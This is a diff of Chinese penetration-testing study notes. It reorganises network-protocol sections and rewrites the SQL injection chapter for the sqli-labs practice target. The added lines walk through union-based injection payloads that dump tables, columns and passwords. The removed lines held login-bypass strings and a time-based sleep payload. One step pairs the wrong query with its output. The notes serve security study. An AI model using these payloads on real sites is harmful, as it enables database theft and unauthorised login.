@@ -14,12 +14,12 @@
       - [UDP与TCP](#udp与tcp)
       - [三次握手与四次挥手](#三次握手与四次挥手)
       - [协议](#协议)
-    - [DNS](#dns)
-      - [邮件协议族](#邮件协议族)
-      - [邮件安全协议](#邮件安全协议)
+        - [邮件协议族](#邮件协议族)
+        - [邮件安全协议](#邮件安全协议)
     - [HTTP/HTTPS基础知识](#httphttps基础知识)
+      - [DNS](#dns)
       - [静态与动态](#静态与动态)
-        - [cookie含义](#cookie含义)
+      - [cookie会话验证和token验证区别以及安全问题](#cookie会话验证和token验证区别以及安全问题)
       - [访问类型](#访问类型)
       - [状态码](#状态码)
     - [代理](#代理)
@@ -145,11 +145,13 @@
       - [逻辑漏洞](#逻辑漏洞)
         - [常规上传](#常规上传)
     - [文件删除](#文件删除)
-  - [逻辑越权](#逻辑越权)
+  - [业务层面漏洞](#业务层面漏洞)
+    - [未授权访问](#未授权访问)
+    - [竞态](#竞态)
     - [越权](#越权)
-      - [水平越权](#水平越权)
-      - [垂直越权](#垂直越权)
-      - [防御](#防御-1)
+        - [水平越权](#水平越权)
+        - [垂直越权](#垂直越权)
+        - [防御](#防御-1)
   - [登录脆弱](#登录脆弱)
     - [验证脆弱](#验证脆弱)
       - [开发者不严谨](#开发者不严谨)
@@ -182,8 +184,11 @@
     - [防御](#防御-2)
   - [RCE（远程命令执行）](#rce远程命令执行)
     - [实例：网站可执行系统命令](#实例网站可执行系统命令)
-  - [数据库注入](#数据库注入)
+  - [SQL注入](#sql注入)
     - [手工注入](#手工注入)
+      - [常规注入](#常规注入)
+        - [变种分析](#变种分析)
+      - [盲注](#盲注)
     - [制造回显](#制造回显)
       - [报错回显](#报错回显)
         - [bool类型注入](#bool类型注入)
@@ -191,14 +196,8 @@
         - [时间SQL注入](#时间sql注入)
           - [制作时间SQL注入](#制作时间sql注入)
           - [其他数据库的时间注入](#其他数据库的时间注入)
-    - [使用万能密码对登录页注入](#使用万能密码对登录页注入)
-      - [用户名不存在](#用户名不存在)
-      - [1. 判断是否存在注入点](#1-判断是否存在注入点)
-      - [2. 判断列数](#2-判断列数)
-      - [3. 信息搜集](#3-信息搜集)
     - [sql注入过程：sqlmap](#sql注入过程sqlmap)
       - [tamper 自定义](#tamper-自定义)
-      - [注入插件脚本编写](#注入插件脚本编写)
     - [跨域连接](#跨域连接)
     - [SQL注入常见防御](#sql注入常见防御)
     - [绕过防御](#绕过防御)
@@ -410,7 +409,7 @@
       - [工具](#工具-7)
 - [待补充：物理攻击](#待补充物理攻击)
   - [wifi](#wifi)
-  - [](#)
+  - [ID卡](#id卡)
 - [待补充：隐藏技术](#待补充隐藏技术)
   - [实用工具](#实用工具)
     - [日志删除](#日志删除)
@@ -460,7 +459,7 @@
 我热爱分享，文章可能有的部分对于你有帮助有的没有，选来用。请善待我的努力和分享精神。食用这篇文章的最好方法就是每次有新收获去在指定章节完善它。所以如果你有热情跟我一起进步，有责任心自始至终的完成这篇文章，那么请加群联系我吧。
 # 常见知识点
 
-只介绍常见和必备基础不涉及到深度
+只介绍常见和必备基础不涉及到深度，并且里面穿插一些与安全相关的知识点
 
 ## 密码学和编码
 
@@ -610,7 +609,54 @@ icmp是Internet控制报文协议。它是TCP/IP协议簇的一个子协议，�
 动态主机配置协议 (Dynamic Host Configuration Protocol，DHCP) 是一个用于局域网的网络协议，位于OSI模型的应用层，使用UDP协议工作，主要用于自动分配IP地址给用户，方便管理员进行统一管理。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/cbb0a34b02bf4711919c5b4da792d23b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-### DNS
+
+
+
+
+##### 邮件协议族
+
+ **SMTP**
+SMTP (Simple Mail Transfer Protocol) 是一种电子邮件传输的协议，是一组用于从源地址到目的地址传输邮件的规范。不启用SSL时端口号为25，启用SSL时端口号多为465或994。
+
+以HTTP协议举例，HTTP协议中有状态码的概念，用于表示当前请求与响应的状态，通过状态码可以定位可能的问题所在，SMTP与HTTP非常相似，都是明文协议。早期SMTP协议的开发初衷是为了解决一个大学中实验室成员进行通信、留言的问题，但随着互联网的发展，SMTP的应用越来越广泛。
+在SMTP协议中，也有状态码的概念，与HTTP协议相同，250表示邮件传送成功。整个SMTP报文分为两类：
+信封
+信的内容
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210621125439191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+ **POP3**
+POP3 (Post Office Protocol 3) 用于支持使用客户端远程管理在服务器上的电子邮件。不启用SSL时端口号为110，启用SSL时端口号多为995。
+
+ **IMAP**
+IMAP (Internet Mail Access Protocol)，即交互式邮件存取协议，它是跟POP3类似邮件访问标准协议之一。不同的是，开启了IMAP后，您在电子邮件客户端收取的邮件仍然保留在服务器上，同时在客户端上的操作都会反馈到服务器上，如：删除邮件，标记已读等，服务器上的邮件也会做相应的动作。不启用SSL时端口号为143，启用SSL时端口号多为993。
+
+##### 邮件安全协议
+
+SMTP相关安全协议 - SPF
+发件人策略框架(Sender Policy Framework , SPF)是为了防范垃圾邮件而提出来的一种DNS记录类型，它是一种TXT类型的记录，它用于登记某个域名拥有的用来外发邮件的所有IP地址。
+
+https://www.ietf.org/rfc/rfc4408.txt
+
+"v=spf1 mx ip4:61.0.2.0/24 ~all"
+
+设置正确的 SPF 记录可以提高邮件系统发送外域邮件的成功率，也可以一定程度上防止别人假冒你的域名发邮件。
+
+SMTP相关安全协议 - DKIM
+DKIM是为了防止电子邮件欺诈的一种技术，同样依赖于DNS的TXT记录类型。这个技术需要将发件方公钥写入域名的TXT记录，收件方收到邮件后，通过查询发件方DNS记录找到公钥，来解密邮件内容。
+
+https://tools.ietf.org/html/rfc6376
+
+SMTP相关安全协议 - DMARC
+DMARC（Domain-based Message Authentication, Reporting & Conformance）是txt记录中的一种，是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，其核心思想是邮件的发送方通过特定方式（DNS）公开表明自己会用到的发件服务器（SPF）、并对发出的邮件内容进行签名(DKIM)，而邮件的接收方则检查收到的邮件是否来自发送方授权过的服务器并核对签名是否有效。对于未通过前述检查的邮件，接收方则按照发送方指定的策略进行处理，如直接投入垃圾箱或拒收。
+
+![2020-02-05-07-06-09](https://img-blog.csdnimg.cn/20210621124953351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+
+https://en.wikipedia.org/wiki/DMARC#Alignment
+
+### HTTP/HTTPS基础知识
+
+#### DNS
 
 
 **DNS解析过程**
@@ -637,52 +683,6 @@ DGA域名有多种生成方式，根据种子类型可以分为确定性和不�
 DNS隧道工具将进入隧道的其他协议流量封装到DNS协议内，在隧道上传输。这些数据包出隧道时进行解封装，还原数据。
 
 
-
-
-#### 邮件协议族
-
- **SMTP**
-SMTP (Simple Mail Transfer Protocol) 是一种电子邮件传输的协议，是一组用于从源地址到目的地址传输邮件的规范。不启用SSL时端口号为25，启用SSL时端口号多为465或994。
-
-以HTTP协议举例，HTTP协议中有状态码的概念，用于表示当前请求与响应的状态，通过状态码可以定位可能的问题所在，SMTP与HTTP非常相似，都是明文协议。早期SMTP协议的开发初衷是为了解决一个大学中实验室成员进行通信、留言的问题，但随着互联网的发展，SMTP的应用越来越广泛。
-在SMTP协议中，也有状态码的概念，与HTTP协议相同，250表示邮件传送成功。整个SMTP报文分为两类：
-信封
-信的内容
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210621125439191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
- **POP3**
-POP3 (Post Office Protocol 3) 用于支持使用客户端远程管理在服务器上的电子邮件。不启用SSL时端口号为110，启用SSL时端口号多为995。
-
- **IMAP**
-IMAP (Internet Mail Access Protocol)，即交互式邮件存取协议，它是跟POP3类似邮件访问标准协议之一。不同的是，开启了IMAP后，您在电子邮件客户端收取的邮件仍然保留在服务器上，同时在客户端上的操作都会反馈到服务器上，如：删除邮件，标记已读等，服务器上的邮件也会做相应的动作。不启用SSL时端口号为143，启用SSL时端口号多为993。
-
-#### 邮件安全协议
-
-SMTP相关安全协议 - SPF
-发件人策略框架(Sender Policy Framework , SPF)是为了防范垃圾邮件而提出来的一种DNS记录类型，它是一种TXT类型的记录，它用于登记某个域名拥有的用来外发邮件的所有IP地址。
-
-https://www.ietf.org/rfc/rfc4408.txt
-
-"v=spf1 mx ip4:61.0.2.0/24 ~all"
-
-设置正确的 SPF 记录可以提高邮件系统发送外域邮件的成功率，也可以一定程度上防止别人假冒你的域名发邮件。
-
-SMTP相关安全协议 - DKIM
-DKIM是为了防止电子邮件欺诈的一种技术，同样依赖于DNS的TXT记录类型。这个技术需要将发件方公钥写入域名的TXT记录，收件方收到邮件后，通过查询发件方DNS记录找到公钥，来解密邮件内容。
-
-https://tools.ietf.org/html/rfc6376
-
-SMTP相关安全协议 - DMARC
-DMARC（Domain-based Message Authentication, Reporting & Conformance）是txt记录中的一种，是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，其核心思想是邮件的发送方通过特定方式（DNS）公开表明自己会用到的发件服务器（SPF）、并对发出的邮件内容进行签名(DKIM)，而邮件的接收方则检查收到的邮件是否来自发送方授权过的服务器并核对签名是否有效。对于未通过前述检查的邮件，接收方则按照发送方指定的策略进行处理，如直接投入垃圾箱或拒收。
-
-![2020-02-05-07-06-09](https://img-blog.csdnimg.cn/20210621124953351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-
-https://en.wikipedia.org/wiki/DMARC#Alignment
-
-### HTTP/HTTPS基础知识
-
-
 #### 静态与动态
 
 静态网页：最常用的格式文件就是html格式文件，大部分网页的格式都是html格式，html格式又包含有.htm、dhtml.xhtml.shtm.shtml。这些都是指静态页面，里面不含有动态程序。
@@ -691,10 +691,15 @@ https://en.wikipedia.org/wiki/DMARC#Alignment
 
 index.php（做个例子实际下index没太大意义）和网页展示的php通常不会是一样文件(网页只有js或html源码和F12结果是一样的，这可以用来判断一些网站是做前端验证还是服务器验证)，前者源码包含的文件更多，后者是解析后的文件。
 
-##### cookie含义
+#### cookie会话验证和token验证区别以及安全问题
+之所以出现这些附加参数是因为http是无状态请求，即这一次请求和上一次请求是没有任何关系的，互不认识的，没有关联的。但这几种认证又有差别。也有的人直接称这一对的区别是cookie和session区别，这与我说的cookie会话和tookie是一个意思。
 
-httponly：限制Cookie仅在HTTP传输过程中被读取，一定程度上防御XSS攻击。
+cookie 会话。服务器验证是查看session id是否匹配得上。存储服务器 存活时间较短  大型。cookie 会话就像比如你登录了一次支付宝，过了几分钟（一般30分钟左右）不用或关闭了浏览器就还需要你登录。一个session在服务器上会占用1kb，人多了还是挺耗内存的。由于跨站自动带上cookie所以存在CSRF攻击。如果管理员在用户退出时未销毁就存在所谓的会话固定，会话固定只需要盗取session就可以登录了。
+token 储存本地。服务器验证是查看参数附带的签名。存活时间较长 小中型。此方案不会存在CSRF攻击因为跨站请求不会自动填写token值，但由于存活时间长，一般容易xss盗取利用等
 
+对方网站如果只认token验证，那么你盗取 cookie会话是没什么价值的。反过来只认 cookie会话你盗取token做验证也是没有价值的。
+
+[想阅读两者区别更多可看这篇文章](https://wuch886.gitbooks.io/front-end-handbook/content/session-cookiehe-token-san-zhe-de-guan-xi-he-qu-bie.html)
 #### 访问类型
 
 get传参与post传参的区别
@@ -784,14 +789,25 @@ Access 和 MySQL 等。
 ###### access
 access数据库不同于其他数据库，它是一个独立的文件，有点像excel表。文件放在网站目录下，格式为mdb
 ###### mysql
-  5.0以下（一般都是2000年左右的没有更新的网站才有）没有information_schema这个系统表，无法列表名等，只能用字典暴力跑表名、列名，这点access也是一样的。5.0以下是多用户单操作，5.0以上是多用户多操做。
-  
+  **增删改查语句**
+
+```bash
+insert into news(id,url,text) values(2,'x','$t')
+delete from news where id=$id
+update user set pwd='$p' where id=2 and username='admin'
+select * from news wher id=$id
+```
+**版本差异**
+|  mysql>5.0   | mysql<=5.0  |
+|  ----  | ----  |
+| 有information_schema这个系统表,可直接查询列表名等  | 没information_schema，只能字典暴力跑表名、列名|
+| 多用户单操作  |  多用户多操作 |
+
+
+
 
 **mysql 基本信息**
-
->默认端口：3306
->注释 `--`
->url使用注释一般要加上符号`+`,即`--+`。加号代表空格
+默认端口：3306
 
 #### 非关系型
 
@@ -1897,13 +1913,9 @@ searchsploit 搜索关键词  --exclude="不包含关键词"
 
 
 # web安全
-
-你应该根据网站的类型去鉴定最可能存在的漏洞是什么，比如社交最可能存在XSS、文件操作最可能存在包含上传或下载漏洞。根据你的猜想首先去测试最可能的网站的漏洞
-
-
-一个任意链接特殊字符意义：  *https://www.baidu.com/s?ie=UTF-8&wd=owasp&tn=88093251_74_hao_pg*  用？隔开参数和资源，字段之间用&分开。有的网站如果只利用Content-Type字段判断文件类型，那么修改了就能恶意上传文件了。
-
-
+**首先测试什么漏洞**
+思路一：你应该根据网站的类型去鉴定最可能存在的漏洞是什么，比如社交最可能存在XSS、文件操作最可能存在包含上传或下载漏洞。根据你的猜想首先去测试最可能的网站的漏洞。
+思路二：根据你想要的结果来选，如想要webshell首先尝试的就是sql注入等危害大的漏洞
 
 ## 中间人攻击
 中间人攻击是一个（缺乏）相互认证的攻击；由于客户端与服务器之间在SSL握手的过程中缺乏相互认证而造成的漏洞
@@ -2218,23 +2230,23 @@ Windows不允许空格和点以及一些特殊字符作为结尾，创建这样�
 unlink，delfile是php中对应删除的函数
 删除数据库安装文件，可以重装数据库。
 
-## 逻辑越权
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712191714272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
+## 业务层面漏洞
+### 未授权访问
+通过删除请求中的认证信息后重放该请求，依旧可以访问或者完成操作。
+### 竞态
+即利用对方在检测函数执行前不断访问资源造成的漏洞；
+常见漏洞：文件上传绕过检测、购买物品余额查询绕过检测
 ### 越权
-
-用户登录的过程是先检测账户名和密码是不是对应得上，对应得上在根据用户的组给予相应权限。
+用户的授权过程是先检测账户名和密码或session等是不是对应得上，对应得上在根据用户的组给予相应权限。这里如果权限控制未设置准确就存在越权漏洞。
 
 ****
+![在这里插入图片描述](https://img-blog.csdnimg.cn/77b3ef05d85b474ca1fab1b21f2df6d7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 水平越权：通过更换的某个ID之类的身份标识，从而使A账号获取(修改、删除等)B账号数据
 
 垂直越权：使用低权限身份的账号，发送高权限账号才能有的请求，获得其高权限的操作。
 
-未授权访问：通过删除请求中的认真信息后重放该请求，依旧可以访问或者完成操作。
-
-#### 水平越权
+##### 水平越权
 
 原理：
 
@@ -2242,11 +2254,11 @@ unlink，delfile是php中对应删除的函数
  - 后盾安全造成：数据库
 
 **常见修改参数**
-如果有水平越权，常见修改数据包的参数有 uid、用户名、cookie的uid值也可以尝试修改的
+uid、用户名、cookie的uid、电话号
 
-**敏感操作**
-通常在于你在登录自己账号时，去通过修改参数登录了别人的账号.
-或你在登录你的主页后尝试切换别人的id
+**后果**
+隐私盗取
+网页私人业务办理
 **发现其他用户**
 用户名
 
@@ -2259,7 +2271,7 @@ unlink，delfile是php中对应删除的函数
 > 看用户主页一般都有ID
 
 
-#### 垂直越权
+##### 垂直越权
 
 前提条件：获取的添加用户的数据包
 怎么来的数据包：
@@ -2268,7 +2280,7 @@ unlink，delfile是php中对应删除的函数
 3.盲猜
 
 
-#### 防御
+##### 防御
 
 1.前后端同时对用户输入信息进行校验，双重验证机制
 2.调用功能前验证用户是否有权限调用相关功能
@@ -2283,6 +2295,7 @@ unlink，delfile是php中对应删除的函数
 
 #### 开发者不严谨
 token（登录者独立令牌）呈现规律性，肉眼可见
+session会话
 通过Session覆盖漏洞重置他人密码
 当验证和重置在一个界面时，可能存在此漏洞：重置别人密码时，替换为自己的手机号
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713124740798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -2571,12 +2584,17 @@ oob
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714142934224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ## RCE（远程命令执行）
-
 在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞比如eval().或者一些参数id可以执行echo &id等命令。
 当遇到这种漏洞，你可以执行一些敏感命令。
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712125552200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712135852588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
+**函数**
+常见的几种语言都有字符串转化为代码的执行函数
+php：eval、assert、system
+python：exec
+java:OGNL、SpEL
+
+**常出现位置**
+明显函数调用了系统命令如ping等
 ### 实例：网站可执行系统命令
 
 当只允许执行某命令试试管道符。
@@ -2588,47 +2606,118 @@ oob
 
 
 
-## 数据库注入
+## SQL注入
+**类型**
+sql注入按照请求类型分为：GET、POST、cookie注入型
+按数据类型分为：数字型、字符型，数字型不用闭合sql语句
+测试方法分为：报错型、延时型、盲注型、布尔型
+
+**防御方法**
+过滤关键词select等
+过滤特殊符号单引号等
+数据库权限为最低而不是默认的系统管理员
+
 **学习方法**
 学习要走常规方法，还是需要用靶机上手啊！靶机如下
-sqli-labs[下载地址](https://github.com/Audi-1/sqli-labs)与[部署到本机方法](https://www.freebuf.com/articles/web/271772.html)，在安装最新版的phpstudy后，你只需要使用恰当的PHP版本5.x与你phpstudy的数据库名密码一致的配置文件。
+sqli-labs[下载地址](https://github.com/Audi-1/sqli-labs)与[部署到本机方法](https://www.freebuf.com/articles/web/271772.html)，在安装最新版的phpstudy后，你只需要使用恰当的PHP版本>5.3(小于这个版本会自带引号转义模式方法，这不利于快速测试)与你phpstudy的数据库名密码一致的配置文件。
 
-**与数据库交互的操作的常见几种方法为**
-select 查询数据
-在网站应用中进行数据显示查询效果
-例： select * from news wher id=$id
 
-insert 插入数据
-在网站应用中进行用户注册添加等操作
-例：insert into news(id,url,text) values(2,'x','$t')
-
-delete 删除数据
-后台管理里面删除文章删除用户等操作
-例：delete from news where id=$id
-
-update 更新数据
-会员或后台中心数据同步或缓存等操作
-例：update user set pwd='$p' where id=2 and username='admin'
-
-order by 排列数据
-一般结合表名或列名进行数据排序操作
-例：select * from news order by $id
-例：select id,name,price from news order by $order
-
+**常见的注入点**
 一般而言除了select，有时候select也没有。大多其他数据库操作都无回显。当没有回显时需要用盲注、时间、报错等制作回显。
 ### 手工注入
+先贴出源码吧，但实际中我会按照黑盒测试走
+#### 常规注入
+```bash
+SELECT * FROM users WHERE id='$id' LIMIT 0,1
+```
+**步骤1.查看有无注入点**
+```bash
+# 输入：
+3''		# 或尝试3’ and 1=1--+ 与 3’ and 1=2--+
 
-**经验：传入不同参数**
-当参数为字符型时系统默认带上单引号。当然如果程序员特立独行，也是可以使用`id='1'`的 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705220943443.png)
-字符型参数的注入你首先要先对前面的单引号或双引号进行闭合。具体是单引号还是双引号，你要去分析
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705231038748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+# 在代码中发生了：
+SELECT * FROM users WHERE id='3'' LIMIT 0,1
 
-****
+# 执行结果：
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''3'' LIMIT 0,1' at line 1
+```
+**步骤2.查看有几列**
+要输入至少两次来找到临界点
+```bash
+# 输入第一次：
+3' order by 4 --+
 
-模糊查询。这种注入需要过滤百分号和单引号
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705221856313.png)
+# 在代码中发生了：
+SELECT * FROM users WHERE id='3' order by 4 -- ' LIMIT 0,1
 
+# 执行结果：
+Unknown column '4' in 'order clause'
+
+# 输入第一次：
+3' order by 3 --+
+
+# 在代码中发生了：
+SELECT * FROM users WHERE id='3' order by 3 -- ' LIMIT 0,1
+
+# 执行结果：
+查询结果
+```
+**步骤3.信息搜集**
+常见搜集database()、version()、user()
+```bash
+# 输入：
+-3' union select 1,database(),version() --+
+
+# 在代码中发生了：
+SELECT * FROM users WHERE id='-3' union select 1,database(),version() -- ' LIMIT 0,1
+
+# 执行结果：
+1，database()、版本名version()
+```
+**步骤4.获得数据库内容**
+```bash
+# 输入以下语句，为爆表名：
+-3'union SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+# 在代码中发生了：
+SELECT * FROM users WHERE id='-3'union SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- ' LIMIT 0,1
+# 执行结果：
+1，2，表名
+
+# 输入以下语句，为爆列名：
+-3'union SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='关注的表名' --+
+# 在代码中发生了：
+SELECT * FROM users WHERE id='-3'union SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- ' LIMIT 0,1
+# 执行结果：
+1，2，列名
+
+# 输入以下语句，为获得字段名：
+-3'union SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='关注的表名' --+
+# 在代码中发生了：
+SELECT * FROM users WHERE id='-3'union SELECT 1,2,group_concat(password) from users-- ' LIMIT 0,1
+# 执行结果：
+1，2，字段名
+```
+##### 变种分析
+这里的变种是以下段代码为基准
+```bash
+SELECT * FROM users WHERE id='$id' LIMIT 0,1
+```
+闭合符号不一样
+```bash
+SELECT * FROM users WHERE id LIMIT 0,1
+SELECT * FROM users WHERE id="$id" LIMIT 0,1
+SELECT * FROM users WHERE id=('$id') LIMIT 0,1
+```
+结论：黑盒注入你首先要先对前面的单引号或双引号进行闭合。具体是单引号还是双引号，要手工尝试分析
+####  盲注
+大概写了个形式代码，其执行逻辑类似于如下。这逻辑结果导致网站的数据库结果不会直接显示在页面上，对于有查询结果的
+```bash
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+if(有查询结果)
+{
+ 	echo 'You are in...........';
+}
+```
 
 
 **经验：多个参数注入一个点**
@@ -2646,9 +2735,6 @@ url/?id=1*&page=2
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715234717488.png)
 
-
-**权限提取**
-如果你注入用户root那你相当于获得了数据库所有表的权限，。但有的网站为了安全，是一个页面一个数据库用户，当你获得这个用户的权限，是无法得到整个数据库的权限的![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070517463665.png)
 
 
 ### 制造回显
@@ -2736,128 +2822,6 @@ WHERE   UserID = 1 AND IF(ASCII(SUBSTRING(username,1,1)) = 97, pg_sleep(10), 'fa
 ```
 
 
-Oracle 更具挑战性，因为注入睡眠函数通常需要在PL/SQL块中完成。PL/SQL 是 Oracle 对 SQL 的扩展，其中包括过程编程语言的元素。它不太可能发生，但基于时间的注入看起来像这样：
-
-```bash
-BEGIN DBMS_LOCK.SLEEP(15); END;
-
-```
-
-### 使用万能密码对登录页注入
-
-产生原因是管理员都会用户输入的用户名和密码进行数据库查询操作。
-由于是字符串查询，由前文可知字符串注入都需要闭合引号。
-
-```bash
-asp aspx万能密码
-1： "or "a"="a
-2： ')or('a'='a
-3：or 1=1--
-4：'or 1=1--
-5：a'or' 1=1--
-6： "or 1=1--
-7：'or'a'='a
-8： "or"="a'='a
-9：'or''='
-10：'or'='or'
-11: 1 or '1'='1'=1
-12: 1 or '1'='1' or 1=1
-13: 'OR 1=1%00
-14: "or 1=1%00
-15: 'xor
-16: 新型万能登陆密码
-
-用户名 ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin）
-密码 1
-Username=-1%cf' union select 1,1,1 as password,1,1,1 %23
-Password=1
-
-
-
-PHP万能密码
-
-'or'='or'
-
-'or 1=1/* 字符型 GPC是否开都可以使用
-
-User: something
-Pass: ' OR '1'='1
-
-jsp 万能密码
-
-1'or'1'='1
-
-admin' OR 1=1/*
-
-用户名：admin 系统存在这个用户的时候 才用得上
-密码：1'or'1'='1
-pydictor、cupp、crunch字典生成工具、自写字典生成py（小黑的人名字典py）；
-dymerge字典合并去重工具、自己写去重py；
-```
-
-#### 用户名不存在
-
-先爆破用户名，再利用被爆破出来的用户名爆破密码。
-其实有些站点，在登陆处也会这样提示
-所有和数据库有交互的地方都有可能有注入。
-
-**什么也不被过滤**
-
-```bash
-什么也不被过滤时，使用已知用户名登录
-输入  用户名 admin' and 1=1 #  密码随便输入
-当什么都没被过滤时，只是这种网站已经寥寥无几了
-select * from admin where username='admin' and 1=1 #' and password='123456' OR 
-```
-
-```bash
-什么也不被过滤时，不知道用户名登录（知道用户名和不知道区别在于是使用and还是or）
-输入   用户名  admin'or 1 #    密码随便输入
-当什么都没被过滤时，只是这种网站已经寥寥无几了
-select * from admin where username='admin'or 1 #' and password='123456' 
-```
-
-**发现'没有被过滤，or，--+，#被过滤**
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210518203512468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-```bash
-输入  用户名 reborn'='  密码 reborn'='
-select * from user where username='reborn'='' and password='reborn'=''
-```
-
-**空格被过滤**
-
->利用URL对制表符的转义将空格替代为%09
->
->sql注入常常在URL地址栏、登陆界面、留言板、搜索框等。这往往给骇客留下了可乘之机。轻则数据遭到泄露，重则服务器被拿下。。攻击者甚至能够完成远程命令执行。这是最常见的一个话题了，网上有很多帮助初学者的且全的小白文章[这篇还行](https://www.anquanke.com/post/id/235970)
->
-
-
-**SQL注入步骤**
-[sql注入实例，靶机测试实例详细,适合新手](https://www.cnblogs.com/shenggang/p/12144945.html)
-[招聘网站sql注入](https://www.cnblogs.com/shenggang/p/12144945.html)
-
-#### 1. 判断是否存在注入点
-
-判断注入点的方法很多，只要一个返回真一个返回假就可以，如下也可以进行判断。如果你总尝试什么and 1=1 与and 1=2 你的请求很容易被拦截
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705150513612.png)
-
-#### 2. 判断列数
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705151215106.png)
-
-
-#### 3. 信息搜集
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705151433704.png)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070516233053.png)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705162639732.png)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705162748179.png)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705162828198.png)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705180805985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705181025600.png)
-
-
 
 
 ### sql注入过程：sqlmap
@@ -2918,12 +2882,6 @@ Havij
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708190916943.png)
 sqlmap在发送请求数据包中user-agent直接申明自己名号，很多防火墙轻易就将此查杀。
 
-#### 注入插件脚本编写
-
-新建一个发送数据包的txt
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708205251356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-用sqlmap参数-r执行
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708205302204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ### 跨域连接
 
@@ -3206,17 +3164,9 @@ cookie注入 后接cookie值
 
 ## xss攻击
 
